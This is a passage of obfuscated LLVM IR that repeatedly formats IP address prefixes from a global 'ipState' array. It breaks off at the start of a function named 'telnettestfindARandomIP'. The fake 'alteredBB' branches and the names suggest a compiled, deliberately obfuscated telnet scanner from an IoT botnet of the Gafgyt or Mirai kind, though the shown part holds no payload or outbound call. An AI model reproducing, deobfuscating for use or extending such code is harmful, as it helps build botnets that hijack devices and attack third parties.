  %5760 = call i32 (i8*, i8*, ...) @szprintf(i8* %5755, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.812, i32 0, i32 0), i32 %5757, i32 %5759)
  br label %originalBB346

originalBB350alteredBB:                           ; preds = %originalBB350, %2907
  %5761 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5762 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5763 = zext i8 %5762 to i32
  %5764 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5765 = zext i8 %5764 to i32
  %5766 = call i32 (i8*, i8*, ...) @szprintf(i8* %5761, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.813, i32 0, i32 0), i32 %5763, i32 %5765)
  br label %originalBB350

originalBB354alteredBB:                           ; preds = %originalBB354, %2933
  %5767 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5768 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5769 = zext i8 %5768 to i32
  %5770 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5771 = zext i8 %5770 to i32
  %5772 = call i32 (i8*, i8*, ...) @szprintf(i8* %5767, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.814, i32 0, i32 0), i32 %5769, i32 %5771)
  br label %originalBB354

originalBB358alteredBB:                           ; preds = %originalBB358, %2959
  %5773 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5774 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5775 = zext i8 %5774 to i32
  %5776 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5777 = zext i8 %5776 to i32
  %5778 = call i32 (i8*, i8*, ...) @szprintf(i8* %5773, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.815, i32 0, i32 0), i32 %5775, i32 %5777)
  br label %originalBB358

originalBB362alteredBB:                           ; preds = %originalBB362, %2992
  %5779 = load i32, i32* %1, align 4
  %5780 = icmp eq i32 %5779, 151
  br label %originalBB362

originalBB366alteredBB:                           ; preds = %originalBB366, %3021
  %5781 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5782 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5783 = zext i8 %5782 to i32
  %5784 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5785 = zext i8 %5784 to i32
  %5786 = call i32 (i8*, i8*, ...) @szprintf(i8* %5781, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.818, i32 0, i32 0), i32 %5783, i32 %5785)
  br label %originalBB366

originalBB370alteredBB:                           ; preds = %originalBB370, %3057
  %5787 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5788 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5789 = zext i8 %5788 to i32
  %5790 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5791 = zext i8 %5790 to i32
  %5792 = call i32 (i8*, i8*, ...) @szprintf(i8* %5787, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.678, i32 0, i32 0), i32 %5789, i32 %5791)
  br label %originalBB370

originalBB374alteredBB:                           ; preds = %originalBB374, %3083
  %5793 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5794 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5795 = zext i8 %5794 to i32
  %5796 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5797 = zext i8 %5796 to i32
  %5798 = call i32 (i8*, i8*, ...) @szprintf(i8* %5793, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.679, i32 0, i32 0), i32 %5795, i32 %5797)
  br label %originalBB374

originalBB378alteredBB:                           ; preds = %originalBB378, %3106
  %5799 = load i32, i32* %1, align 4
  %5800 = icmp eq i32 %5799, 156
  br label %originalBB378

originalBB382alteredBB:                           ; preds = %originalBB382, %3175
  %5801 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5802 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5803 = zext i8 %5802 to i32
  %5804 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5805 = zext i8 %5804 to i32
  %5806 = call i32 (i8*, i8*, ...) @szprintf(i8* %5801, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.682, i32 0, i32 0), i32 %5803, i32 %5805)
  br label %originalBB382

originalBB386alteredBB:                           ; preds = %originalBB386, %3208
  %5807 = load i32, i32* %1, align 4
  %5808 = icmp eq i32 %5807, 163
  br label %originalBB386

originalBB390alteredBB:                           ; preds = %originalBB390, %3237
  %5809 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5810 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5811 = zext i8 %5810 to i32
  %5812 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5813 = zext i8 %5812 to i32
  %5814 = call i32 (i8*, i8*, ...) @szprintf(i8* %5809, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.685, i32 0, i32 0), i32 %5811, i32 %5813)
  br label %originalBB390

originalBB394alteredBB:                           ; preds = %originalBB394, %3260
  %5815 = load i32, i32* %1, align 4
  %5816 = icmp eq i32 %5815, 165
  br label %originalBB394

originalBB398alteredBB:                           ; preds = %originalBB398, %3306
  %5817 = load i32, i32* %1, align 4
  %5818 = icmp eq i32 %5817, 168
  br label %originalBB398

originalBB402alteredBB:                           ; preds = %originalBB402, %3325
  %5819 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5820 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5821 = zext i8 %5820 to i32
  %5822 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5823 = zext i8 %5822 to i32
  %5824 = call i32 (i8*, i8*, ...) @szprintf(i8* %5819, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.664, i32 0, i32 0), i32 %5821, i32 %5823)
  br label %originalBB402

originalBB406alteredBB:                           ; preds = %originalBB406, %3348
  %5825 = load i32, i32* %1, align 4
  %5826 = icmp eq i32 %5825, 169
  br label %originalBB406

originalBB410alteredBB:                           ; preds = %originalBB410, %3394
  %5827 = load i32, i32* %1, align 4
  %5828 = icmp eq i32 %5827, 172
  br label %originalBB410

originalBB414alteredBB:                           ; preds = %originalBB414, %3430
  %5829 = load i32, i32* %1, align 4
  %5830 = icmp eq i32 %5829, 174
  br label %originalBB414

originalBB418alteredBB:                           ; preds = %originalBB418, %3459
  %5831 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5832 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5833 = zext i8 %5832 to i32
  %5834 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5835 = zext i8 %5834 to i32
  %5836 = call i32 (i8*, i8*, ...) @szprintf(i8* %5831, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.824, i32 0, i32 0), i32 %5833, i32 %5835)
  br label %originalBB418

originalBB422alteredBB:                           ; preds = %originalBB422, %3492
  %5837 = load i32, i32* %1, align 4
  %5838 = icmp eq i32 %5837, 177
  br label %originalBB422

originalBB426alteredBB:                           ; preds = %originalBB426, %3521
  %5839 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5840 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5841 = zext i8 %5840 to i32
  %5842 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5843 = zext i8 %5842 to i32
  %5844 = call i32 (i8*, i8*, ...) @szprintf(i8* %5839, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.692, i32 0, i32 0), i32 %5841, i32 %5843)
  br label %originalBB426

originalBB430alteredBB:                           ; preds = %originalBB430, %3544
  %5845 = load i32, i32* %1, align 4
  %5846 = icmp eq i32 %5845, 179
  br label %originalBB430

originalBB434alteredBB:                           ; preds = %originalBB434, %3580
  %5847 = load i32, i32* %1, align 4
  %5848 = icmp eq i32 %5847, 181
  br label %originalBB434

originalBB438alteredBB:                           ; preds = %originalBB438, %3606
  %5849 = load i32, i32* %1, align 4
  %5850 = icmp eq i32 %5849, 182
  br label %originalBB438

originalBB442alteredBB:                           ; preds = %originalBB442, %3635
  %5851 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5852 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5853 = zext i8 %5852 to i32
  %5854 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5855 = zext i8 %5854 to i32
  %5856 = call i32 (i8*, i8*, ...) @szprintf(i8* %5851, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.695, i32 0, i32 0), i32 %5853, i32 %5855)
  br label %originalBB442

originalBB446alteredBB:                           ; preds = %originalBB446, %3671
  %5857 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5858 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5859 = zext i8 %5858 to i32
  %5860 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5861 = zext i8 %5860 to i32
  %5862 = call i32 (i8*, i8*, ...) @szprintf(i8* %5857, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.828, i32 0, i32 0), i32 %5859, i32 %5861)
  br label %originalBB446

originalBB450alteredBB:                           ; preds = %originalBB450, %3697
  %5863 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5864 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5865 = zext i8 %5864 to i32
  %5866 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5867 = zext i8 %5866 to i32
  %5868 = call i32 (i8*, i8*, ...) @szprintf(i8* %5863, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.829, i32 0, i32 0), i32 %5865, i32 %5867)
  br label %originalBB450

originalBB454alteredBB:                           ; preds = %originalBB454, %3723
  %5869 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5870 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5871 = zext i8 %5870 to i32
  %5872 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5873 = zext i8 %5872 to i32
  %5874 = call i32 (i8*, i8*, ...) @szprintf(i8* %5869, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.830, i32 0, i32 0), i32 %5871, i32 %5873)
  br label %originalBB454

originalBB458alteredBB:                           ; preds = %originalBB458, %3746
  %5875 = load i32, i32* %1, align 4
  %5876 = icmp eq i32 %5875, 188
  br label %originalBB458

originalBB462alteredBB:                           ; preds = %originalBB462, %3775
  %5877 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5878 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5879 = zext i8 %5878 to i32
  %5880 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5881 = zext i8 %5880 to i32
  %5882 = call i32 (i8*, i8*, ...) @szprintf(i8* %5877, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.832, i32 0, i32 0), i32 %5879, i32 %5881)
  br label %originalBB462

originalBB466alteredBB:                           ; preds = %originalBB466, %3811
  %5883 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5884 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5885 = zext i8 %5884 to i32
  %5886 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5887 = zext i8 %5886 to i32
  %5888 = call i32 (i8*, i8*, ...) @szprintf(i8* %5883, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.834, i32 0, i32 0), i32 %5885, i32 %5887)
  br label %originalBB466

originalBB470alteredBB:                           ; preds = %originalBB470, %3854
  %5889 = load i32, i32* %1, align 4
  %5890 = icmp eq i32 %5889, 194
  br label %originalBB470

originalBB474alteredBB:                           ; preds = %originalBB474, %3903
  %5891 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5892 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5893 = zext i8 %5892 to i32
  %5894 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5895 = zext i8 %5894 to i32
  %5896 = call i32 (i8*, i8*, ...) @szprintf(i8* %5891, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.838, i32 0, i32 0), i32 %5893, i32 %5895)
  br label %originalBB474

originalBB478alteredBB:                           ; preds = %originalBB478, %3936
  %5897 = load i32, i32* %1, align 4
  %5898 = icmp eq i32 %5897, 199
  br label %originalBB478

originalBB482alteredBB:                           ; preds = %originalBB482, %3962
  %5899 = load i32, i32* %1, align 4
  %5900 = icmp eq i32 %5899, 200
  br label %originalBB482

originalBB486alteredBB:                           ; preds = %originalBB486, %3981
  %5901 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5902 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5903 = zext i8 %5902 to i32
  %5904 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5905 = zext i8 %5904 to i32
  %5906 = call i32 (i8*, i8*, ...) @szprintf(i8* %5901, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.841, i32 0, i32 0), i32 %5903, i32 %5905)
  br label %originalBB486

originalBB490alteredBB:                           ; preds = %originalBB490, %4027
  %5907 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5908 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5909 = zext i8 %5908 to i32
  %5910 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5911 = zext i8 %5910 to i32
  %5912 = call i32 (i8*, i8*, ...) @szprintf(i8* %5907, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.844, i32 0, i32 0), i32 %5909, i32 %5911)
  br label %originalBB490

originalBB494alteredBB:                           ; preds = %originalBB494, %4083
  %5913 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5914 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5915 = zext i8 %5914 to i32
  %5916 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5917 = zext i8 %5916 to i32
  %5918 = call i32 (i8*, i8*, ...) @szprintf(i8* %5913, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.847, i32 0, i32 0), i32 %5915, i32 %5917)
  br label %originalBB494

originalBB498alteredBB:                           ; preds = %originalBB498, %4106
  %5919 = load i32, i32* %1, align 4
  %5920 = icmp eq i32 %5919, 208
  br label %originalBB498

originalBB502alteredBB:                           ; preds = %originalBB502, %4125
  %5921 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5922 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5923 = zext i8 %5922 to i32
  %5924 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5925 = zext i8 %5924 to i32
  %5926 = call i32 (i8*, i8*, ...) @szprintf(i8* %5921, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.707, i32 0, i32 0), i32 %5923, i32 %5925)
  br label %originalBB502

originalBB506alteredBB:                           ; preds = %originalBB506, %4171
  %5927 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5928 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5929 = zext i8 %5928 to i32
  %5930 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5931 = zext i8 %5930 to i32
  %5932 = call i32 (i8*, i8*, ...) @szprintf(i8* %5927, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.709, i32 0, i32 0), i32 %5929, i32 %5931)
  br label %originalBB506

originalBB510alteredBB:                           ; preds = %originalBB510, %4194
  %5933 = load i32, i32* %1, align 4
  %5934 = icmp eq i32 %5933, 212
  br label %originalBB510

originalBB514alteredBB:                           ; preds = %originalBB514, %4230
  %5935 = load i32, i32* %1, align 4
  %5936 = icmp eq i32 %5935, 214
  br label %originalBB514

originalBB518alteredBB:                           ; preds = %originalBB518, %4249
  %5937 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5938 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5939 = zext i8 %5938 to i32
  %5940 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5941 = zext i8 %5940 to i32
  %5942 = call i32 (i8*, i8*, ...) @szprintf(i8* %5937, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.712, i32 0, i32 0), i32 %5939, i32 %5941)
  br label %originalBB518

originalBB522alteredBB:                           ; preds = %originalBB522, %4282
  %5943 = load i32, i32* %1, align 4
  %5944 = icmp eq i32 %5943, 216
  br label %originalBB522

originalBB526alteredBB:                           ; preds = %originalBB526, %4338
  %5945 = load i32, i32* %1, align 4
  %5946 = icmp eq i32 %5945, 220
  br label %originalBB526

originalBB530alteredBB:                           ; preds = %originalBB530, %4394
  %5947 = load i32, i32* %1, align 4
  %5948 = icmp eq i32 %5947, 224
  br label %originalBB530

originalBB534alteredBB:                           ; preds = %originalBB534, %4423
  %5949 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5950 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5951 = zext i8 %5950 to i32
  %5952 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5953 = zext i8 %5952 to i32
  %5954 = call i32 (i8*, i8*, ...) @szprintf(i8* %5949, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.723, i32 0, i32 0), i32 %5951, i32 %5953)
  br label %originalBB534

originalBB538alteredBB:                           ; preds = %originalBB538, %4456
  %5955 = load i32, i32* %1, align 4
  %5956 = icmp eq i32 %5955, 227
  br label %originalBB538

originalBB542alteredBB:                           ; preds = %originalBB542, %4475
  %5957 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5958 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5959 = zext i8 %5958 to i32
  %5960 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5961 = zext i8 %5960 to i32
  %5962 = call i32 (i8*, i8*, ...) @szprintf(i8* %5957, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.725, i32 0, i32 0), i32 %5959, i32 %5961)
  br label %originalBB542

originalBB546alteredBB:                           ; preds = %originalBB546, %4498
  %5963 = load i32, i32* %1, align 4
  %5964 = icmp eq i32 %5963, 228
  br label %originalBB546

originalBB550alteredBB:                           ; preds = %originalBB550, %4527
  %5965 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5966 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5967 = zext i8 %5966 to i32
  %5968 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5969 = zext i8 %5968 to i32
  %5970 = call i32 (i8*, i8*, ...) @szprintf(i8* %5965, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.727, i32 0, i32 0), i32 %5967, i32 %5969)
  br label %originalBB550

originalBB554alteredBB:                           ; preds = %originalBB554, %4550
  %5971 = load i32, i32* %1, align 4
  %5972 = icmp eq i32 %5971, 230
  br label %originalBB554

originalBB558alteredBB:                           ; preds = %originalBB558, %4579
  %5973 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5974 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5975 = zext i8 %5974 to i32
  %5976 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5977 = zext i8 %5976 to i32
  %5978 = call i32 (i8*, i8*, ...) @szprintf(i8* %5973, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.729, i32 0, i32 0), i32 %5975, i32 %5977)
  br label %originalBB558

originalBB562alteredBB:                           ; preds = %originalBB562, %4602
  %5979 = load i32, i32* %1, align 4
  %5980 = icmp eq i32 %5979, 232
  br label %originalBB562

originalBB566alteredBB:                           ; preds = %originalBB566, %4641
  %5981 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5982 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5983 = zext i8 %5982 to i32
  %5984 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5985 = zext i8 %5984 to i32
  %5986 = call i32 (i8*, i8*, ...) @szprintf(i8* %5981, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.732, i32 0, i32 0), i32 %5983, i32 %5985)
  br label %originalBB566

originalBB570alteredBB:                           ; preds = %originalBB570, %4707
  %5987 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5988 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5989 = zext i8 %5988 to i32
  %5990 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5991 = zext i8 %5990 to i32
  %5992 = call i32 (i8*, i8*, ...) @szprintf(i8* %5987, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.737, i32 0, i32 0), i32 %5989, i32 %5991)
  br label %originalBB570

originalBB574alteredBB:                           ; preds = %originalBB574, %4740
  %5993 = load i32, i32* %1, align 4
  %5994 = icmp eq i32 %5993, 241
  br label %originalBB574

originalBB578alteredBB:                           ; preds = %originalBB578, %4779
  %5995 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5996 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5997 = zext i8 %5996 to i32
  %5998 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5999 = zext i8 %5998 to i32
  %6000 = call i32 (i8*, i8*, ...) @szprintf(i8* %5995, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.741, i32 0, i32 0), i32 %5997, i32 %5999)
  br label %originalBB578

originalBB582alteredBB:                           ; preds = %originalBB582, %4815
  %6001 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %6002 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %6003 = zext i8 %6002 to i32
  %6004 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %6005 = zext i8 %6004 to i32
  %6006 = call i32 (i8*, i8*, ...) @szprintf(i8* %6001, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.743, i32 0, i32 0), i32 %6003, i32 %6005)
  br label %originalBB582

originalBB586alteredBB:                           ; preds = %originalBB586, %4838
  %6007 = load i32, i32* %1, align 4
  %6008 = icmp eq i32 %6007, 256
  br label %originalBB586

originalBB590alteredBB:                           ; preds = %originalBB590, %4884
  %6009 = load i32, i32* %1, align 4
  %6010 = icmp eq i32 %6009, 259
  br label %originalBB590

originalBB594alteredBB:                           ; preds = %originalBB594, %4910
  %6011 = load i32, i32* %1, align 4
  %6012 = icmp eq i32 %6011, 260
  br label %originalBB594

originalBB598alteredBB:                           ; preds = %originalBB598, %4936
  %6013 = load i32, i32* %1, align 4
  %6014 = icmp eq i32 %6013, 261
  br label %originalBB598

originalBB602alteredBB:                           ; preds = %originalBB602, %5002
  %6015 = load i32, i32* %1, align 4
  %6016 = icmp eq i32 %6015, 266
  br label %originalBB602

originalBB606alteredBB:                           ; preds = %originalBB606, %5021
  %6017 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %6018 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %6019 = zext i8 %6018 to i32
  %6020 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %6021 = zext i8 %6020 to i32
  %6022 = call i32 (i8*, i8*, ...) @szprintf(i8* %6017, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.748, i32 0, i32 0), i32 %6019, i32 %6021)
  br label %originalBB606

originalBB610alteredBB:                           ; preds = %originalBB610, %5044
  %6023 = load i32, i32* %1, align 4
  %6024 = icmp eq i32 %6023, 267
  br label %originalBB610

originalBB614alteredBB:                           ; preds = %originalBB614, %5090
  %6025 = load i32, i32* %1, align 4
  %6026 = icmp eq i32 %6025, 270
  br label %originalBB614

originalBB618alteredBB:                           ; preds = %originalBB618, %5136
  %6027 = load i32, i32* %1, align 4
  %6028 = icmp eq i32 %6027, 273
  br label %originalBB618

originalBB622alteredBB:                           ; preds = %originalBB622, %5195
  %6029 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %6030 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %6031 = zext i8 %6030 to i32
  %6032 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %6033 = zext i8 %6032 to i32
  %6034 = call i32 (i8*, i8*, ...) @szprintf(i8* %6029, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.757, i32 0, i32 0), i32 %6031, i32 %6033)
  br label %originalBB622

originalBB626alteredBB:                           ; preds = %originalBB626, %5248
  %6035 = load i32, i32* %1, align 4
  %6036 = icmp eq i32 %6035, 281
  br label %originalBB626

originalBB630alteredBB:                           ; preds = %originalBB630, %5297
  %6037 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %6038 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %6039 = zext i8 %6038 to i32
  %6040 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %6041 = zext i8 %6040 to i32
  %6042 = call i32 (i8*, i8*, ...) @szprintf(i8* %6037, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.858, i32 0, i32 0), i32 %6039, i32 %6041)
  br label %originalBB630

originalBB634alteredBB:                           ; preds = %originalBB634, %5320
  %6043 = load i32, i32* %1, align 4
  %6044 = icmp eq i32 %6043, 285
  br label %originalBB634

originalBB638alteredBB:                           ; preds = %originalBB638, %5349
  %6045 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %6046 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %6047 = zext i8 %6046 to i32
  %6048 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %6049 = zext i8 %6048 to i32
  %6050 = call i32 (i8*, i8*, ...) @szprintf(i8* %6045, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.664, i32 0, i32 0), i32 %6047, i32 %6049)
  br label %originalBB638

originalBB642alteredBB:                           ; preds = %originalBB642, %5372
  %6051 = load i32, i32* %1, align 4
  %6052 = icmp eq i32 %6051, 288
  br label %originalBB642
}

; Function Attrs: noinline nounwind uwtable
define i32 @telnettestfindARandomIP() #0 {
